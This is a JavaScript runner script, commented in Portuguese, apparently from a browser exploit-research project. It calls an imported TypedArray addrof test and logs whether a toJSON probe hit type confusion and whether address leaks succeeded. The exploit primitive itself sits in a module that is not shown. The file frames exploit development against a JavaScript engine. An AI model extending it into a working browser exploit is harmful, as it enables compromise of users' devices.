// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_TargetUnknownThis,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_TargetUnknownThis";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (TargetUnknownThis) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_TargetUnknownThis(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    if (result.all_probe_call_details_for_analysis && result.all_probe_call_details_for_analysis.length > 0) {
        // Logar todos os detalhes pode ser muito verboso, talvez apenas o último ou os que tiveram confusão
        logS3(`   Detalhes de TODAS as chamadas da sonda (para depuração): ${JSON.stringify(result.all_probe_call_details_for_analysis)}`, "dev_verbose");
    }
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-TUT) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedByLastProbe = false;
        if (result.toJSON_details && 
            result.toJSON_details.this_type === "[object Object]") { 
            heisenbugConfirmedByLastProbe = true;
        }

        let anyAddrofSuccess = false;
        const addrofChecks = [
            {name: "OutputLeakyA", res: result.addrof_Output_A}, // Nome atualizado
            {name: "OutputLeakyB", res: result.addrof_Output_B}  // Nome atualizado
        ];

        addrofChecks.forEach(item => {
            if (item.res && item.res.success) {
                 logS3(`     ADDROF ${item.name} SUCESSO! ${item.res.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
            } else if (item.res) {
                 logS3(`     ADDROF ${item.name} FALHOU: ${item.res.msg}`, "warn", FNAME_RUNNER);
            }
        });


        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
            logS3(`     ERRO INTERNO NA ÚLTIMA SONDA: ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-TUT) toJSON_ERR`;
        } else if (heisenbugConfirmedByLastProbe) {
            logS3(`     !!!! TYPE CONFUSION NO 'this' DA ÚLTIMA SONDA OBSERVADA !!!! Call #${result.toJSON_details.call_number}, Tipo: ${result.toJSON_details.this_type}`, "critical", FNAME_RUNNER);
            // ... outros logs de detalhes da sonda ...
            if (result.toJSON_details.writes_on_confused_this_attempted) { 
                 logS3(`       Escritas addrof tentadas no 'this' confuso da última sonda. Chaves Finais: ${result.toJSON_details.confused_this_final_keys ? result.toJSON_details.confused_this_final_keys.join(',') : 'N/A'}`, "info");
            }

            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-TUT) Sonda OK, Addr Fail`;
            } else { 
                 document.title = `Heisenbug (TypedArray-TUT) AddrInOutput SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-TUT) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (TargetUnknownThis) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (TargetUnknownThis) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Sonda OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT} Concluído`;
        }
    }
}
